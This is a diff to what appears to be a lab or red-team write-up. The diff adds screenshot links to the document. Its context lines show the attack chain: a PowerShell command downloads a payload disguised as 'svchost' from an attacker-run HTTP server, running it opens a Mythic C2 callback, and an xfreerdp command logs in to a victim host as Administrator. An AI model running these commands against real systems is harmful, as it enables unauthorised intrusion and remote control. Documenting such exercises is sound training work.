@@ -311,9 +311,11 @@ python3 -m http.server 9999
 Invoke-WebRequest -Uri http://<MYTHIC-SERVER-IP>:9999/svchost-sparshsaraiya.exe `
   -OutFile "C:\Users\Public\Downloads\svchost-sparshsaraiya.exe"
 ```
+![Mythic Active Callback Dashboard](attachments/invoke-web.png)
 
 Executing the payload established an active C2 callback to the Mythic server:
 
+![Mythic Active Callback Dashboard](attachments/mythic-c2-dashboard.png)
 ![Mythic Active Callback](attachments/mythic-callback.png)
 ![Mythic Dashboard](attachments/mythic-dashboard.png)
 
@@ -357,6 +359,8 @@ RDP access was then established directly from Kali:
 ```bash
 xfreerdp3 /u:Administrator /p:'<password>' /v:<WINDOWS-VICTIM-IP>:3389 /cert:ignore
 ```
+
+![Hydra RDP Success](attachments/xfreerdp.png)
 
 ### Phase 2 — Discovery
 
